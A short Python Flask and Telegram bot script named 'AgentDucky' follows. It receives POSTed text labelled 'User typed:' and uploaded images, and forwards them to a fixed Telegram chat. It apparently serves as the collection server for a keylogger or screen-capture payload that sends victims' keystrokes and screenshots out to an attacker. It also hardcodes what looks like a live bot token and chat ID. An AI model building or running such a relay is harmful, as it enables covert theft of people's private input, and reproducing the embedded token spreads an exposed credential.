from flask import Flask, request
import telebot

# Initialize your bot
bot = telebot.TeleBot("6754219801:AAFK0LCK9ZK7z1-OVHSpitQDeawXPkAtXOM")

# Initialize your Flask app
app = Flask(__name__)

# Define your webhook URL route
@app.route("/updatetext", methods=['POST'])
def webhooktext():
    # Return Text
    data = request.get_json()
    # Access key-value pairs from the JSON data
    if 'Text' in request.get_json():
        value = data['Text']
        bot.send_message("765916595", "User typed: " + value)
        return "Text send"
    else:
        return "Text not send"

@app.route("/updateimg", methods=['POST'])
def webhookimg():
    data = request.files
    # Access key-value pairs from the form-data
    if 'Image' in data:
        image_file = request.files['Image']
        bot.send_photo("765916595", image_file)
        return "Image send"

    else:
        return "Image not send"

# Define a route for the root URL (for health checks, etc.)
@app.route("/")
def index():
    return "Agent is running."

@bot.message_handler(commands=['start', 'hello'])
def send_welcome(message):
    bot.reply_to(message, "AgentDucky In")



# Start the Flask app
if __name__ == "__main__":
    app.run()

